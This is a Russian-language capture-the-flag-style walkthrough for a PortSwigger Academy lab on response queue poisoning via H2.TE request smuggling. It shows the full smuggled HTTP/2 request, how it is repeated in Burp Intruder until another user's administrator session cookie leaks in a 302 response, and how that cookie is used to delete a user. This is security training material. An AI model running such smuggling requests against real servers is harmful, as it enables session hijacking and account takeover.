Перейдем на уязвимый ресурс

Перейдем в `Proxy` -> `HTTP history` и отправим в `Repeater` запрос на корневую страницу
изменим ее на 
```
POST / HTTP/2
Host: 0a560020040b60a3802f4e44009f00c7.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /qwe HTTP/1.1
X-ignore: x
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/11.%20Response%20queue%20poisoning%20via%20H2.TE%20request%20smuggling/pics%20for%20walkthrough/1.png)

и при отправке вдогонку обычного запроса 
```
GET / HTTP/2
```
получим
```
HTTP/2 404 Not Found
Content-Type: application/json; charset=utf-8
Set-Cookie: session=y9Ke0JiO9cYSBDAeimkkpKWXUhnwjUE6; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 11

"Not Found"
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/11.%20Response%20queue%20poisoning%20via%20H2.TE%20request%20smuggling/pics%20for%20walkthrough/2.png)

тлично, далее модифицируем наш запрос, чтобы нам не пришлось посылать второй запрос, и чтобы сделать нашу жизнь проще
```
POST /asdasdafafqwfqfqwdqdqwd HTTP/2
Host: 0a560020040b60a3802f4e44009f00c7.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /qweqrweggwerheghwerhgweh HTTP/1.1
Host: 0a560020040b60a3802f4e44009f00c7.web-security-academy.net
```

и на каждый ответ мы видим 404 ошибку
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/11.%20Response%20queue%20poisoning%20via%20H2.TE%20request%20smuggling/pics%20for%20walkthrough/3.png)

Чтобы не играть в постоянное отправление запросов, отправим запрос в `Intruder` 
выберем `Null payload`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/11.%20Response%20queue%20poisoning%20via%20H2.TE%20request%20smuggling/pics%20for%20walkthrough/4.png)
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/11.%20Response%20queue%20poisoning%20via%20H2.TE%20request%20smuggling/pics%20for%20walkthrough/5.png)
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/11.%20Response%20queue%20poisoning%20via%20H2.TE%20request%20smuggling/pics%20for%20walkthrough/8.png)
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/11.%20Response%20queue%20poisoning%20via%20H2.TE%20request%20smuggling/pics%20for%20walkthrough/9.png)
спустя время увидим респонс `302`
```
HTTP/2 302 Found
Location: /my-account?id=administrator
Set-Cookie: session=2zBod9YDGD9eLqVAcvGSvT0pWsvxA1He; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/11.%20Response%20queue%20poisoning%20via%20H2.TE%20request%20smuggling/pics%20for%20walkthrough/6.png)

Изменим куки в браузере, и удалим carlos'а как этого и требует задание и получим уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/11.%20Response%20queue%20poisoning%20via%20H2.TE%20request%20smuggling/pics%20for%20walkthrough/7.png)
